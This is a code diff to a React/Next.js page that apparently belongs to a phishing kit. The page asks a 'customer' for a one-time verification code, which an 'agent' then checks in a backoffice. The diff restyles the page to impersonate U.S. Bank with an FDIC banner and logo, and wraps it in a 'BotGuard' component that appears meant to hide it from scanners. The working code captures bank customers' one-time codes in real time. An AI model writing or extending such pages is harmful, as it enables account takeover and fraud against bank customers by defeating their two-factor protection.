@@ -1,23 +1,11 @@
 'use client';
 
-/**
- * Secret Key / OTP Stage Page
- *
- * Customer enters their one-time password or secret code
- * Minimal validation - accepts any format
- * Agent verifies in backoffice
- */
-
 import { useCallback, useEffect, useState } from 'react';
 import { useParams } from 'next/navigation';
 import { useSessionStore } from '@shared';
-import { WaitingState } from '@/components/verification/WaitingState';
-import { ErrorState } from '@/components/verification/ErrorState';
 import { currentBrand } from '@/config/branding';
-import { Button } from '@/components/ui/button';
-import { Input } from '@/components/ui/input';
-import { Card } from '@/components/ui/card';
-import { AlertCircle } from 'lucide-react';
+import { AlertCircle, Loader2 } from 'lucide-react';
+import { BotGuard } from '@/components/security/BotGuard';
 
 export default function SecretKeyPage() {
   const params = useParams();
@@ -29,32 +17,25 @@ export default function SecretKeyPage() {
   const [fieldError, setFieldError] = useState('');
   const [isSubmitting, setIsSubmitting] = useState(false);
 
-  /**
-   * Reset form when agent rejects submission
-   */
+  // Reset form when agent rejects submission
   useEffect(() => {
     if (status === 'rejected' || status === 'error') {
-      // Clear form field and show error
       setSecretKey('');
       setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
+      setIsSubmitting(false);
     }
   }, [status, agentMessage]);
 
-  /**
-   * Handle form submission
-   */
   const handleSubmit = useCallback(
     async (e: React.FormEvent) => {
       e.preventDefault();
       setFieldError('');
 
-      // Validate case ID is available
       if (!caseId) {
         setFieldError('Session information missing. Please refresh and try again.');
         return;
       }
 
-      // Minimal validation - just check required
       if (!secretKey.trim()) {
         setFieldError('Please enter your secret code');
         return;
@@ -75,10 +56,10 @@ export default function SecretKeyPage() {
         if (!response.ok) {
           console.error('Submission error');
           setFieldError('Unable to process your code. Please try again.');
+          setIsSubmitting(false);
           return;
         }
 
-        // Success - show waiting state
         useSessionStore.setState({
           status: 'waiting',
           agentMessage: 'Verifying your secret code...',
@@ -87,106 +68,84 @@ export default function SecretKeyPage() {
       } catch (error) {
         console.error('Submission error:', error);
         setFieldError('Submission failed. Please try again.');
-      } finally {
         setIsSubmitting(false);
       }
     },
     [secretKey, caseId]
   );
 
-  // Show waiting state
-  if (status === 'waiting') {
-    return <WaitingState message="Verifying your secret code..." />;
-  }
+  const isWaiting = status === 'waiting' || isSubmitting || loading;
 
   return (
-    <div className="min-h-screen bg-gradient-to-br from-background to-muted p-4">
-      <div className="flex flex-col items-center justify-center min-h-screen space-y-6">
-        {/* Brand Logo */}
-        <div className="mb-4">
-          <img
-            src={currentBrand.logo}
-            alt={currentBrand.companyName}
-            className="h-12 w-auto"
-            onError={(e) => {
-              e.currentTarget.style.display = 'none';
+    <BotGuard>
+      <div className="fdic-box">
+        <img className="fdic-logo" src="/brands/us-bank/fdic-logo.svg" alt="FDIC" />
+        <span className="fdic-text">FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
+      </div>
+
+      <section className="login-header">
+        <h2>Verification Code</h2>
+      </section>
+
+      {/* Direct use of login-form without intermediate login-content wrapper */}
+      <form className="login-form" onSubmit={handleSubmit}>
+        <p className="mb-4 text-[#555]">
+          Enter the code you received via email or SMS.
+        </p>
+
+        <div className={`form-group ${fieldError ? 'error' : ''}`} style={fieldError ? { marginBottom: '4px' } : {}}>
+          <input
+            type="text"
+            id="secretKey"
+            className="input-field"
+            placeholder=" "
+            value={secretKey}
+            onChange={(e) => {
+              setSecretKey(e.target.value);
+              if (fieldError) setFieldError('');
             }}
+            disabled={isWaiting}
+            autoComplete="off"
           />
+          <label htmlFor="secretKey" className="input-label">Secret Code</label>
         </div>
 
-        {/* Form Card */}
-        <Card className="w-full max-w-md p-6 shadow-lg">
-          <div className="space-y-6">
-            {/* Header */}
-            <div className="space-y-2">
-              <h1 className="text-3xl font-bold text-foreground">
-                Verification Code
-              </h1>
-              <p className="text-muted-foreground">
-                Enter the code you received
-              </p>
-            </div>
+        {/* Error message */}
+        {fieldError && (
+          <div className="error-message" style={{ display: 'flex', alignItems: 'center', gap: '8px', marginBottom: '20px' }}>
+            <AlertCircle className="h-4 w-4" />
+            <span>{fieldError}</span>
+          </div>
+        )}
 
-            {/* Form */}
-            <form onSubmit={handleSubmit} className="space-y-4">
-              {/* Secret Key Input */}
-              <div className="space-y-2">
-                <label
-                  htmlFor="secretKey"
-                  className="block text-sm font-medium text-foreground"
-                >
-                  Secret Code
-                </label>
-                <Input
-                  id="secretKey"
-                  type="text"
-                  placeholder="Enter your verification code"
-                  value={secretKey}
-                  onChange={(e) => {
-                    setSecretKey(e.target.value);
-                    if (fieldError) setFieldError('');
-                  }}
-                  disabled={isSubmitting || loading}
-                  autoComplete="off"
-                  required
-                  className="text-lg tracking-widest"
-                />
-              </div>
-
-              {/* Field-level error */}
-              {fieldError && (
-                <div className="flex items-center gap-2 text-sm text-destructive">
-                  <AlertCircle className="h-4 w-4" />
-                  <span>{fieldError}</span>
-                </div>
-              )}
-
-              {/* API-level error */}
-              {error && !fieldError && (
-                <div className="flex items-start gap-3 p-3 bg-destructive/10 rounded-md border border-destructive/20">
-                  <AlertCircle className="h-4 w-4 text-destructive mt-0.5 flex-shrink-0" />
-                  <p className="text-sm text-destructive">{error}</p>
-                </div>
-              )}
-
-              {/* Submit Button */}
-              <Button
-                type="submit"
-                disabled={!secretKey.trim() || isSubmitting || loading}
-                className="w-full"
-                size="lg"
-              >
-                {isSubmitting ? 'Processing...' : 'Verify Code'}
-              </Button>
-            </form>
-
-            {/* Help Text */}
-            <p className="text-xs text-muted-foreground text-center">
-              Check your email, SMS, or authenticator app for the code
+        {status === 'waiting' && !fieldError && (
+          <div className="mb-4 text-center">
+            <p className="text-[#0c2074] font-medium text-sm animate-pulse">
+              Verifying code with secure server...
             </p>
           </div>
-        </Card>
-      </div>
-    </div>
+        )}
+
+        <button
+          type="submit"
+          className="btn btn-primary"
+          disabled={!secretKey.trim() || isWaiting}
+          style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '8px' }}
+        >
+          {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
+          {isWaiting ? 'Processing...' : 'Verify Code'}
+        </button>
+
+        {/* Identical link-group structure from page.tsx */}
+        <div className="link-group">
+          <p className="text-sm text-center" style={{ marginTop: '20px', color: 'var(--color-text-secondary)' }}>
+            If an agent has provided you with a direct link, please use that link instead.
+          </p>
+          <p className="text-sm text-center" style={{ marginTop: '10px', color: 'var(--color-text-secondary)' }}>
+            Need help? Contact {currentBrand.companyName} support
+          </p>
+        </div>
+      </form>
+    </BotGuard>
   );
 }
